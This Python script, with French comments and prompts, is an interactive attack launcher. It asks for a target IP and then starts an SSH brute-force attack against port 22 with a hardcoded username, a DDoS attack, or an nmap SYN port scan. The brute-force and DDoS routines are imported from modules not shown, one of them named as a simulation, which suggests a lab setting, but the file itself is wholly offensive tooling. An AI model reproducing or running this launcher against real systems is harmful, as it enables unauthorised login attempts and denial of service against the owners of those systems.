from bruteforce import ssh_bruteforce
from ddos_simulation import ddos_attack
import subprocess

def port_scan(ip):
    try:
        # Exécuter un scan SYN avec nmap
        result = subprocess.run(['nmap', '-sS', ip], capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f'Error during port scan: {e}')

def runAttack():
    while True:
        # Demander à l'utilisateur l'IP cible
        target_ip = input("Entrez l'adresse IP cible (ou tapez 'exit' pour quitter) : ").strip()
        
        if target_ip.lower() == 'exit':
            print("Quitter le script...")
            break
        
        # Demander à l'utilisateur le type d'attaque
        print("Choisissez l'attaque à lancer :")
        print("1: Attaque par force brute SSH")
        print("2: Attaque DDOS")
        print("3: Scan de ports")
        print("4: Quitter")
        # Ajouter d'autres attaques ici
        attack_choice = input("Entrez le numéro de l'attaque choisie : ").strip()

        if attack_choice == '1':
            # Paramètres pour l'attaque par force brute SSH
            target_port = 22  # Port SSH
            target_username = 'els'  # Nom d'utilisateur SSH
            success = ssh_bruteforce(target_ip, target_port, target_username)
            if not success:
                print('Bruteforce attack failed.')
        elif attack_choice == '2':
            ddos_attack(target_ip)
        elif attack_choice == '3':
            port_scan(target_ip)
        elif attack_choice == '4':
            print("Quitter le script...")
            break
        else:
            print("Choix invalide. Aucune attaque lancée.")

# Lancer le menu d'attaques
runAttack()
